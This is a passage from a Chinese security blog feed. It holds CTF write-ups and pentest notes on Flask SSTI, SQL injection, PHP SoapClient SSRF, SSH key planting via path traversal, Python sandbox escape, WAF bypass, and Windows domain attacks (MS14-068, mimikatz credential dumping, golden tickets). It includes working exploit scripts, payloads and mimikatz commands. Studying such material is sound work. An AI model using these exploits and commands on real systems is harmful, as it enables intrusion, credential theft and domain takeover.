    <content type="text"><![CDATA[在2018山东省省赛出现的一个ctf题目：easy flask 可以看到该页面提供了两个功能，一个是add,另一个是searcha/。而题目是easy flask,自然想到flask/jinja2的SSTI。在add处输入payload尝试一下。12username:boocomment:&#123;&#123;config&#125;&#125; 然后search一下username,发现注入成功。 但是拿出payload深入测试时，却发现对username和commemnt的内容做了长度限制。 此处先放一放，继续测试下面的search功能。发现存在sql注入。1payload1: ' union select 1,2,3 -- + 那么便可以利用sql注入，将ssti的payload显示到页面上，从而达到模板注入的效果。 最终的payload为：123-1' union select 1,2,"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('cat /flag').read()&#125;&#125;" -- -]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[session反序列化+soap(ssrf+crlf)]]></title>
    <url>%2Fsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-soap-ssrf-crlf%2F</url>
    <content type="text"><![CDATA[出自LCTF2018一道web题：bestphp’s revenge 这道题目还是很有意思的，思路也很清奇。 首先题目给出源码index.php123456789101112&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&#123; $_SESSION[name] = $_GET[name];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),'welcome_to_the_lctf2018');call_user_func($b,$a);?&gt; 然后还扫到一个flag.php1234567session_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER["REMOTE_ADDR"]==="127.0.0.1")&#123; $_SESSION['flag'] = $flag; &#125;only localhost can get flag! 可以看到拿到flag的条件是绕过$_SERVER[“REMOTE_ADDR”]===”127.0.0.1”。这里可以利用ssrf本地去访问flag.php这里利用的思路1session反序列化-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类 首先构造出session反序列化的条件:利用call_user_func()调用session_start()设置erialize_handler为php_serialize。因为题目源码中没有可以利用的构造pop链的类，而刚好SOAP的SoapClient类可以用来创建soap数据报文，与wsdl接口进行交互的，达到ssrf的效果。那么就可以构造soapClient的反序列化(具体参考https://www.anquanke.com/post/id/153065#h2-5[从几道CTF题看SOAP安全问题][1]、[https://xz.aliyun.com/t/2148][2])1payload = '|O:10:"SoapClient":3:&#123;s:3:"uri";s:3:"123";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:13:"_soap_version";i:1;&#125;' 最后需要再利用第二个call_user_func激活soap类，具体实施是通过变量覆盖利用extract将$b为call_user_func，调用$a中对象，从而触发soap的网络请求。这里数组a中$_SESSION里的数据是soap对象，再经过reset()弹出这个对象成为了$a[0]。12$_GET = array('f'=&gt;'extract');$_POST = array('b'=&gt;'call_user_func'); 附一payload12345678910111213141516171819202122232425import requestsimport reurl = "http://172.81.210.82/"payload = '|O:10:"SoapClient":3:&#123;s:3:"uri";s:3:"123";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:13:"_soap_version";i:1;&#125;'r = requests.session()data = &#123;'serialize_handler' : 'php_serialize'&#125;url1 = url+"?f=session_start&amp;name="+payloadhtml = r.post(url1, data=data).textdata = &#123;'b' : "call_user_func"&#125;url2 = url+"?f=extract&amp;name="+payloadhtml = r.post(url2, data=data).textdata = &#123;'b' : "var_dump"&#125;url2 = url+"?f=extract&amp;name="+payloadhtml = r.post(url2, data=data).textrs = re.findall(r'string\(26\) "(.*?)"', html)url2 = urlcookie = &#123;"Cookie":"PHPSESSID="+rs[0]&#125;html = r.post(url2,headers = cookie).textprint html 资料：LCTF 2018 Writeup – Nu1L]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python ssrf+put上传ssh公钥]]></title>
    <url>%2Fpython-ssrf-put%E4%B8%8A%E4%BC%A0ssh%E5%85%AC%E9%92%A5%2F</url>
    <content type="text"><![CDATA[0x00 前言来源于lctf2018的一道web题：Travel 0x01 题目源码首先题目给出源码1234567891011121314151617181920212223242526@app.route('/upload/&lt;filename&gt;', methods = ['PUT'])def upload_file(filename): name = request.cookies.get('name') pwd = request.cookies.get('pwd') if name != 'lctf' or pwd != str(uuid.getnode()): return "0" filename = urllib.unquote(filename) with open(os.path.join(app.config['UPLOAD_FOLDER'], filename), 'w') as f: f.write(request.get_data(as_text = True)) return "1" return "0"@app.route('/', methods = ['GET'])def index(): url = request.args.get('url', '') if url == '': return render_template('index.html') if "http" != url[: 4]: return "hacker" try: response = requests.get(url, timeout = 10) response.encoding = 'utf-8' return response.text except: return "Something Error" 0x02 题目分析可以看到只要name=’lctf’&amp;&amp;pwd=str(uuid.getnode())即可登陆成功上传任意文件。而这里需要知道uuid.getnode()也就是网卡地址。正常的话可以读取/sys/class/net/eth0/address来获得。题目是Python + requests库。requests库的底层是urllib，而没有任何扩展的urllib仅支持http和https协议，因此我们没有办法读取任意文件。我们查一查IP，就能发现是腾讯云的机器。既然是云服务商，那么通常就会有一个metadata的API。例如，Amazon EC2，就可以通过 http://169.254.169.254 来获取metadata，而所有基于OpenStack搭建的云服务也都使用这个地址。 因此，让我们查看腾讯云的文档，很容易就能搞出payload：1http://118.25.150.86/?url=http://metadata.tencentyun.com/latest/meta-data/mac 得到网卡地址152:54:00:48:c8:73（hex）-&gt;90520735500403(int) 然后在put的时候会出现一个问题 会出现一个405 not allowed而与POST出现的不太一样。 那么这里可以确认是Nginx层面上禁止了PUT。Flask对这个问题有解决方案，即X-HTTP-Method-Override头。 这里利用任意文件写+目录穿透上传ssh公钥。在本地生成ssh公钥123cd /root/.ssh/ssh-keygen -t rsa -P '' 然后将公钥上传到目录 1/home/lctf/.ssh/authorized_keys 这里需要注意到是需要将目录进行两次url编码1..%252f..%252f..%252f..%252f..%252f..%252fhome%252flctf%252f.ssh%252fauthorized_keys 然后即可进行登陆1ssh lctf@118.25.150.86]]></content>
      <categories>
        <category>python安全</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python安全tips]]></title>
    <url>%2Fpython-%E5%AE%89%E5%85%A8-tips%2F</url>
    <content type="text"><![CDATA[Input function在python2中，通过input输入的内容将作为python代码执行。 1234567$ python2 &gt;&gt;&gt; input() dir() ['__builtins__', '__doc__', '__name__', '__package__'] &gt;&gt;&gt; input() __import__('sys').exit() $ 安全的输入方式是使用raw_input()获取stdin内容，在python3中input已变得跟raw_input相等。 Assert在python中使用assert语句使用断言，例如使用断言以判断程序是否可以继续执行。1234def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... 这样使用并没有什么问题，但是当程序使用python -O 编译为优化的字节码时，会导致asser语句被忽略。 In Python 2.7, -O has the following effect: the byte code extension changes to .pyo sys.flags.optimize gets set to 1 debug is False assert don’t get executed 可重复使用整数1234&gt;&gt;&gt; 999+1 is 1000 False&gt;&gt;&gt; 1+1 is 2 True 这两个结果看起来有点匪夷所思，但实际上是我们对is有错误的理解。is操作符是在两个对象的标识上工作的，并不能用于比较数值。在python中，万物皆对象，每个对象都有一个唯一标识，可以用id函数来读取。要找出两个变量或两个属性是否都指向同一个对象，可以使用is操作符。 浮点数比较12&gt;&gt;&gt; 2.2 * 3.0 == 3.3 * 2.0 False 上面的结果是由于固有受限精度导致舍入错误:1234&gt;&gt;&gt; (2.2 * 3.0).hex() '0x1.a666666666667p+2' &gt;&gt;&gt; (3.3 * 2.0).hex() '0x1.a666666666666p+2' float &gt; 无穷在python中，float类型支持无穷大的概念:float(‘infinity’)12&gt;&gt;&gt; 10**1000000 &gt; float('infinity') False 因此我们有理由相信，一切都比无穷小,但是一不小心，又翻车了 任意type对象比无穷大1234&gt;&gt;&gt; float &gt; float('infinity') True&gt;&gt;&gt; int &gt; float('infinity') True 这一车祸现场在python3中被处理，type()不能与float()进行比较。 私有属性python不支持对象隐藏属性，但是其提供一种使用双下划线__开头的属性隐藏方法。 123456789101112class Foo: __N=111111 N =222222 def __init__(self,name): self.__Name=name def __f1(self): print self.__Name def f2(self): self.__f1() def get_private(self): ... return self.__N 定义上面的class123456789&gt;&gt;&gt; f = Foo('boogle')&gt;&gt;&gt; f.N 222222&gt;&gt;&gt; f.__N AttributeError: Foo instance has no attribute '__N'&gt;&gt;&gt; f.__f1() AttributeError: Foo instance has no attribute '__f1'&gt;&gt;&gt; f.f2() boogle 从上面的测试来看，使用__开头貌似确实实现了隐藏，而且其也成功在 getattr()/hasattr()中隐藏12&gt;&gt;&gt; f.has_private() False 但这种隐藏只是一种语法上的变形，并没有达到真正意义上的隐藏 12&gt;&gt;&gt;print Foo.__dict__ &#123;'__module__': '__main__', '_Foo__f1': &lt;function __f1 at 0x02D8D0B0&gt;, 'f2': &lt;function f2 at 0x02D8D070&gt;, 'N': 222222, '_Foo__N': 111111, '__doc__': None, '__init__': &lt;function __init__ at 0x02D8D130&gt;&#125; 得到Foo类的所有属性跟函数。那么有没有办法直接查看这些属性的内容呢？答案是肯定的,我们可以用下划线_加类名加属性名的方法查看其内容（注意类名前是单下划线）1234&gt;&gt;&gt; f._Foo__N 111111&gt;&gt;&gt; f.__dict__ &#123;'_Foo__Name': 'boogle'&#125; 另外当对属性进行重新赋值时，这些隐藏的属性也会被显示出来 12345&gt;&gt;&gt; f.__N = 333333&gt;&gt;&gt; f.__N 333333&gt;&gt;&gt; f.has_private() True 模块注入python的模块导入为python注入了活力，其功能强大而复杂，例如通过 os ```可以导入系统命令模块，从而执行系统系统命令。1234python中模块和包可以通过定义在sys.path列表中的搜索路径找到的文件或目录名导入。搜索路径初始化是一个复杂的过程，它也依赖于Python版本，平台和本地配置。要想对其实施模块注入，就要知道其初始化的搜索路径，从来正确导入。我们可以运行下面的脚本知道其实际的搜索路径 $ cat myapp.py #!/usr/bin/python import sys import pprint pprint.pprint(sys.path) 123456```$ python -m myapp ['', '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg', '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg', ...] 从上面程序执行结果可以看到，其当前工作目录被自动插入到sys.path中。那么便可以在sys.path中出现的任意一个我们具有操作权限的目录写入我们要导入的模块，从而进行导入。两外在沙箱环境中，很有可能会删除然会我们继续查看，会发现sys下面又一个modules。我们对sys.moudles做一些改动，看看会发生什么12345&gt;&gt;&gt; sys.modules['os']=None&gt;&gt;&gt; import osTraceback (most recent call last):File "&lt;stdin&gt;", line 1, in &lt;module&gt;ImportError: No module named os 果然如我们所料,将os从 sys.modules 中删掉之后,就不能再引入了。那么当一个沙箱环境通过这种方式将可能带来危险的模块删除时，我们便可以重新导入 1234&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules['os']='/usr/lib/python2.7/os.py' &gt;&gt;&gt; import os&gt;&gt;&gt; 另外如果sys也被禁止导入了呢？那么可以使用execfile()执行相应的代码123456789&gt;&gt;&gt; execfile('/usr/lib/python2.7/os.py')&gt;&gt;&gt; system('cat /etc/passwd')root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologin...&gt;&gt;&gt; getcwd()'/usr/lib/python2.7' subprocess shell注入shell = True时此时如果命令参数可控，即可进行shell注入 1s=subprocess.Popen('ls;id', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE) shell = False时subprocess.call([]) 执行的是list拼接起来的命令，如果可控参数在拼接之后使得参数变成了参数选项，则存在命令注入风险123&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt;&gt;&gt;&gt; call(['/bin/ls', '/tmp']) 参考链接：A bite of PythonPython 如何隐藏属性]]></content>
      <categories>
        <category>python安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Unicode安全]]></title>
    <url>%2FUnicode%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[结合HCTF2018的一道web题：admin 题目源码 这道题比较有意思，思路偏门新奇。题目的目标是以admin身份登陆，下载源码之后，是一个python基于flask框架写的一个web程序，审计代码之后发现，在注册、登陆、修改密码时都用到了strlower这个函数将username转化为小写。而这里有一个偏门的小知识，那就是unicode安全，具体参考：Unicode安全我们这里可以利用的是：1ᴬ -&gt; A -&gt; a 也就是我们注册一个 ᴬdmin的用户，注册时经过strlower转化会变为 Admin,而再修改密码时，又会转化为 admin。从而达到最终越权的目的。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsondecode解编码绕过sqlWAF]]></title>
    <url>%2Fjsondecode%E8%A7%A3%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87sqlWAF%2F</url>
    <content type="text"><![CDATA[hctf2018的一道web题目：kzone。打开后是一个qq空间钓鱼网站，打开js跳转到qq zone官网。禁用浏览器解析javascript： 搜一下目录之后发现www.zip,下载后得到源码。审计一波后台登陆等均为发现可以利用的点。最后决定还是从2018.php入手。 在第二行的位置引入了common.php，继续跟踪。在commen.php中又引入了其他的文件，最终定位在member.php。 而且在member.php中并不是功能函数，那么也就是说在包含进该php文件后是会直接执行的，而且直接将传入的json数据直接带进了sql查询语句。本来到这剧情应该时一切顺利。直接开撸就可以了，但是在构造sleep盲注之后却发现没有任何反应。无奈之下又去审计前面的代码。发现在safe.php中对传入的get,post,cookie进行了waf过滤。safe.php在member.php之前被加载，所以也被先执行。而且member.php第一行对IN_CRONLITE进行了判断，即不能直接访问member.php，只能从上层引入。而且这个waf可以说拦截的非常严格了，盲注用到的sleep，benchmark均被过滤。然后到这就歇菜了。 最终还是看了大佬写的wiriteup：HCTF2018-WEB-详细Write up 里面提到了jsondecode可以解编码，那么我们对关键字继续宁unicode编码之后传入，这样就直接绕过waf了。具体jsondecode解编码见前辈的文章：浅谈json参数解析对waf绕过的影响 附文中脚本: 12345678910111213141516171819202122232425262728293031# -*- coding: utf-8 -*-import requestsimport stringurl = 'http://kzone.2018.hctf.io/include/common.php'str1 = string.ascii_letters+string.digits+'&#123;&#125;!@#$*&amp;_,'def check(payload): cookie=&#123; 'PHPSESSID':'8ehnp28ccr4ueh3gnfc3uqtau1', 'islogin':'1', 'login_data':payload &#125; try: requests.get(url,cookies=cookie,timeout=3) return 0 except: return 1result=''for i in range(1,33): for j in str1: #payload='&#123;"admin_user":"admin\'and/**/\\u0069f(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003Ddatabase()/**/limit/**/0,1),%d,1)\\u003D\'%s\',\\u0073leep(3),0)/**/and/**/\'1","admin_pass":65&#125;'%(i,j) payload = '&#123;"admin_user":"admin\'/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\'1","admin_pass":"123"&#125;'% (str(i),ord(j)) #print('[+]'+payload) if check(payload): result += j break print result 两外也有大佬编写了tamper，直接掏出了sqlmap也是非常的方便:用sqlmap解题2018HCTF-Kzone]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透基础]]></title>
    <url>%2F%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[0x01 基础知识1.域和工作组的区别域和工作组是局域网上两种不同的网络资源管理模式，它们之间的主要区别是对网络中的计算机和其他资源的管理方式不同。 工作组 概述：工作组是最常用最简单最普遍的资源管理模式。为什么说他简单是因为默认情况下windows计算机都是采用工作组方式进行资源管理的。默认情况下所有计算机都处在名为workgroup的工作组中。 优点：将不同的电脑一般按功能分别列入不同的组中，如软件部的电脑都列入“软件部”工作组中，网络部的电脑都列入“网络部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。计算机通过工作组进行分类，使得我们访问资源更加具有层次化。 问题：没有办法统一管理（比如统一安装软件）；没办法集中身份验证（工作组中的计算机相互独立，相互访问时需要输入密码的） 特点：工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。他的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共享。 域 概述：与工作组的平等性有所不同，“域”是一个相对严格的管理模式，解决了工作组无法统一管理、没办法集中身份验证的问题。“域”指的是服务器控制网络上的计算机能否加入。实行严格的管理对网络安全是非常必要的。 概念解释：活动目录（Active Directory），AD：活动目录是WindowsServer在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC。 2.DNS定位域控制器DNS负责将域名解析成IP地址 内网的DNS则可以定位DC，域会有名称，比如domaintest。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC。 通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身。 3.AD(活动目录）的安装Windows2008R2中创建域控制器参考文章Windows2008如何配置域控制器(活动目录)主要命令dcpromo然后根据需要下一步即可。 搭建完AD之后，主域控会生成一个krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证 4.域成员主机加入域成员的加入，需要注意的是： 配置成员主机与控制在同一ip段 配置成员主机dns为域控ip（域控主机被设置为DNS服务器） 在我的电脑-属性-电脑名称中修改domain即可，输入域控主机名字然后弹出窗口输入账号密码即可。 那么在加入域之后有什么变化呢？ 其中比较明显的就是在登陆的时候，可以发现xp传统的登陆界面没有了。而出现了一个登陆界面，在这个界面中可可以选择以域内其他用户的身份登陆主机。 添加域用户 思考? 域管理员、域用户、域成员主机？区别 0x02 kerberos简单介绍kerberos一词原意为希腊神话中守护地狱之门的一条三头神犬。麻省理工学院在雅典娜计划中以此为名，提出了并实现了用于计算机网络的身份认证协议。以kerberos为名，显示了该协议具有相当的安全性。 功能 一个安全认证协议 用tickets验证 避免本地保存密码和在互联网上传输密码 包含一个可信任的第三方 使用对称加密 客户端与服务器之间能够相互验证 以上的特点表明，Kerberos只提供一种功能——在网络上安全的完成用户的身份验证 认证过程kerberos协议的认证过程可以两个部分： 证明自己 请求他人 在说明kerberos的认证过程之前，先简单介绍几个基本的名词。 KDC (key distribution center) key分配中心，受信任的第三方 AS (the Authentication Server) 认证服务 TGS (Ticket Granting Service) 票据授予服务 TGT (ticket-granting ticket) 票据那么从上面的层次可以大概了解到，KDC作为kerberos协议信任的第三方，包括AS和TGS,而TGT票据是由TGS授予的。 证明自己的过程Client向KDC发送自己的身份信息，KDC从Ticket Granting Service得到TGT(ticket-granting ticket)， 并用协议开始前Client与KDC之间的密钥将TGT加密回复给Client。此时只有真正的Client才能利用它与KDC之间的密钥将加密后的TGT解密，从而获得TGT。（此过程避免了Client直接向KDC发送密码，以求通过验证的不安全方式） 请求他人的过程Client利用之前获得的TGT向KDC请求其他Service的Ticket，从而通过其他Service的身份鉴别。 1． Client将之前获得TGT和要请求的服务信息(服务名等)发送给KDC，KDC中的Ticket Granting Service将为Client和Service之间生成一个Session Key用于Service对Client的身份鉴别。然后KDC将这个Session Key和用户名，用户地址（IP），服务名，有效期, 时间戳一起包装成一个Ticket(这些信息最终用于Service对Client的身份鉴别)发送给Service， 不过Kerberos协议并没有直接将Ticket发送给Service，而是通过Client转发给Service.所以有了第二步。2． 此时KDC将刚才的Ticket转发给Client。由于这个Ticket是要给Service的，不能让Client看到，所以KDC用协议开始前KDC与Service之间的密钥将Ticket加密后再发送给Client。同时为了让Client和Service之间共享那个秘密(KDC在第一步为它们创建的Session Key)， KDC用Client与它之间的密钥将Session Key加密随加密的Ticket一起返回给Client。3． 为了完成Ticket的传递，Client将刚才收到的Ticket转发到Service. 由于Client不知道KDC与Service之间的密钥，所以它无法算改Ticket中的信息。同时Client将收到的Session Key解密出来，然后将自己的用户名，用户地址（IP）打包成Authenticator用Session Key加密也发送给Service。4． Service 收到Ticket后利用它与KDC之间的密钥将Ticket中的信息解密出来，从而获得Session Key和用户名，用户地址（IP），服务名，有效期。然后再用Session Key将Authenticator解密从而获得用户名，用户地址（IP）将其与之前Ticket中解密出来的用户名，用户地址（IP）做比较从而验证Client的身份。5． 如果Service有返回结果，将其返回给Client。 上面是标准Kerberos协议的基本流程，MIT也实现了一套标准的Kerberos协议，而微软在Windows平台上的Kerberos并没有采用MIT的实现，而是对Kerberos协议进行了一些扩充，其中最重要的扩充就是增加了认证过程中的权限认证，也就是在协议中增加了PAC（PrivilegeAttribute Certificate），特权属性证书。 0X03 信息收集 常用命令12345678910111213141516171819202122232425262728293031323334353637383940ipconfig /all ------ 查询本机IP段，所在域等net user ------ 本机用户列表net localgroup administrators ------ 本机管理员[通常含有域用户]net user /domain ------ 查询域用户net group /domain ------ 查询域里面的工作组net group "domain admins" /domain ------ 查询域管理员用户组net localgroup administrators /domain ------ 登录本机的域管理员net localgroup administrators workgroup\user001 /add ------域用户添加到本机net group "domain controllers" /domain ------ 查看域控制器(如果有多台)net time /domain ------ 判断主域，主域服务器都做时间服务器net config workstation ------ 当前登录域net session ------ 查看当前会话net use \\ip\ipc$ pawword /user:username ------ 建立IPC会话net share ------ 查看SMB指向的路径[即共享]net view ------ 查询同一域内机器列表net view \\ip ------ 查询某IP共享net view /domain ------ 查询域列表net view /domain:domainname ------ 查看workgroup域中计算机列表net start ------ 查看当前运行的服务net accounts ------ 查看本地密码策略net accounts /domain ------ 查看域密码策略nbtstat –A ip ------netbios 查询netstat –an/ano/anb ------ 网络连接查询route print ------ 路由表tasklist /V ----- 查看进程[显示对应用户]tasklist /S ip /U domain\username /P /V ----- 查看远程计算机进程列表qprocess * ----- 类似tasklistqprocess /SERVER:IP ----- 远程查看计算机进程列表nslookup –qt-MX Yahoo.com ----- 查看邮件服务器whoami /all ----- 查询当前用户权限等set ----- 查看系统环境变量systeminfo ----- 查看系统信息qwinsta ----- 查看登录情况qwinsta /SERVER:IP ----- 查看远程登录情况fsutil fsinfo drives ----- 查看所有盘符gpupdate /force ----- 更新域策略 0x04 获取域管理员权限：MS14-068ms14-068漏洞在域控没有打补丁（kb3011780）时，能将任意域用户，提升为域管理员权限。 该漏洞利用是通过客户端来伪造高权限的PAC产生的。详细介绍：深入解读MS14-068漏洞补充：添加域用户MS14-068 域用户权限提升漏洞复现 神器mimikatz 12privilege::debugsekurlsa::logonpasswords ms14068.exe 伪造kerberos票据1net group "domain controllers" /domain 获取计算机名称 12ms14-068.exe -u test@domaintest.com -p 123456 -s S-1-5-21-1607545464-3564583392-2085136103-1114-d WIN-0IQJV7P073G.domaintest.com mimikatz 导入票据 1mimikatz.exe "kerberos::ptc TGT_test@domaintest.com.ccache" exit 拿到域管理权限便可进行其他一系列操作123456dir \\WIN-0IQJV7P073G.domaintest.com\c$ 注意这里应为域控主机名称，不能为ipnet user admin xxxxx@password /add /domainnet group "Domain Admins" admin /add /domainPsExec.exe \\192.168.111.129 cmd.exe 0x05 权限维持：黄金票据原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log "lsadump::dcsync /domaintest.com /user:krbtgt" 构造黄金票据并注入内存1234mimikatz # kerberos::purgemimikatz # kerberos::golden /admin:Administrator /domain:domaintest.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribimimikatz # kerberos::ptt Administrator.kiribimimikatz # kerberos::tgt 当然除了golden ticket，silver ticket之外还有kerberos ticket，历史SID，AdminSDHolder，DSRM，GPP，DCSync等技术手段都可以用来当做域控的隐藏后门。 参考文章 域渗透——Pass The Ticket l3m0n:从零开始内网渗透学习 初级域渗透系列 - 01. 基本介绍&amp;信息获取 初级域渗透系列 - 02. 常见攻击方法 - 1 初级域渗透系列 - 03. 常见攻击方法]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域环境搭建]]></title>
    <url>%2F%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[万事开头难，想学习一下域渗透，自己搭建个域是比较方便的，搭建过程中遇到的一些问题记录一下。 在本次环境中域控主机为windows server 2008 r2，域成员为 windows xp. Windows2008R2中创建域控制器参考文章Windows2008如何配置域控制器(活动目录)主要命令dcpromo然后根据需要下一步即可。 域成员的加入，需要注意的是： 配置成员主机与控制在同一ip段 配置成员主机dns为域控ip（域控主机被设置为DNS服务器） 在我的电脑-属性-电脑名称中修改domain即可，输入域控主机名字然后弹出窗口输入账号密码即可。 那么在加入域之后有什么变化呢？ 其中比较明显的就是在登陆的时候，可以发现xp传统的登陆界面没有了。而出现了一个登陆界面，在这个界面中可可以选择以域内其他成员的身份登陆主机。]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kerberos认证过程]]></title>
    <url>%2Fkerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[简单介绍kerberos一词原意为希腊神话中守护地狱之门的一条三头神犬。麻省理工学院在雅典娜计划中以此为名，提出了并实现了用于计算机网络的身份认证协议。以kerberos为名，显示了该协议具有相当的安全性。 功能 一个安全认证协议 用tickets验证 避免本地保存密码和在互联网上传输密码 包含一个可信任的第三方 使用对称加密 客户端与服务器之间能够相互验证 以上的特点表明，Kerberos只提供一种功能——在网络上安全的完成用户的身份验证 认证过程kerberos协议的认证过程可以两个部分： 证明自己 请求他人 在说明kerberos的认证过程之前，先简单介绍几个基本的名词。 KDC (key distribution center) key分配中心，受信任的第三方 AS (the Authentication Server) 认证服务 TGS (Ticket Granting Service) 票据授予服务 TGT (ticket-granting ticket) 票据 那么从上面的层次可以大概了解到，KDC作为kerberos协议信任的第三方，包括AS和TGS,而TGT票据是由TGS授予的。 证明自己的过程Client向KDC发送自己的身份信息，KDC从Ticket Granting Service得到TGT(ticket-granting ticket)， 并用协议开始前Client与KDC之间的密钥将TGT加密回复给Client。此时只有真正的Client才能利用它与KDC之间的密钥将加密后的TGT解密，从而获得TGT。（此过程避免了Client直接向KDC发送密码，以求通过验证的不安全方式） 请求他人的过程Client利用之前获得的TGT向KDC请求其他Service的Ticket，从而通过其他Service的身份鉴别。 1． Client将之前获得TGT和要请求的服务信息(服务名等)发送给KDC，KDC中的Ticket Granting Service将为Client和Service之间生成一个Session Key用于Service对Client的身份鉴别。然后KDC将这个Session Key和用户名，用户地址（IP），服务名，有效期, 时间戳一起包装成一个Ticket(这些信息最终用于Service对Client的身份鉴别)发送给Service， 不过Kerberos协议并没有直接将Ticket发送给Service，而是通过Client转发给Service.所以有了第二步。2． 此时KDC将刚才的Ticket转发给Client。由于这个Ticket是要给Service的，不能让Client看到，所以KDC用协议开始前KDC与Service之间的密钥将Ticket加密后再发送给Client。同时为了让Client和Service之间共享那个秘密(KDC在第一步为它们创建的Session Key)， KDC用Client与它之间的密钥将Session Key加密随加密的Ticket一起返回给Client。3． 为了完成Ticket的传递，Client将刚才收到的Ticket转发到Service. 由于Client不知道KDC与Service之间的密钥，所以它无法算改Ticket中的信息。同时Client将收到的Session Key解密出来，然后将自己的用户名，用户地址（IP）打包成Authenticator用Session Key加密也发送给Service。4． Service 收到Ticket后利用它与KDC之间的密钥将Ticket中的信息解密出来，从而获得Session Key和用户名，用户地址（IP），服务名，有效期。然后再用Session Key将Authenticator解密从而获得用户名，用户地址（IP）将其与之前Ticket中解密出来的用户名，用户地址（IP）做比较从而验证Client的身份。5． 如果Service有返回结果，将其返回给Client。]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kerberos黄金票据]]></title>
    <url>%2Fkerberos%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log "lsadump::dcsync /domaintest.com /user:krbtgt" 构造黄金票据并注入内存1234mimikatz # kerberos::purgemimikatz # kerberos::golden /admin:Administrator /domain:domaintest.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribimimikatz # kerberos::ptt Administrator.kiribimimikatz # kerberos::tgt 当然除了golden ticket，silver ticket之外还有kerberos ticket，历史SID，AdminSDHolder，DSRM，GPP，DCSync等技术手段都可以用来当做域控的隐藏后门。 域渗透——Pass The Ticket]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透：MS14-068]]></title>
    <url>%2F%E5%9F%9F%E6%B8%97%E9%80%8F%EF%BC%9AMS14-068%2F</url>
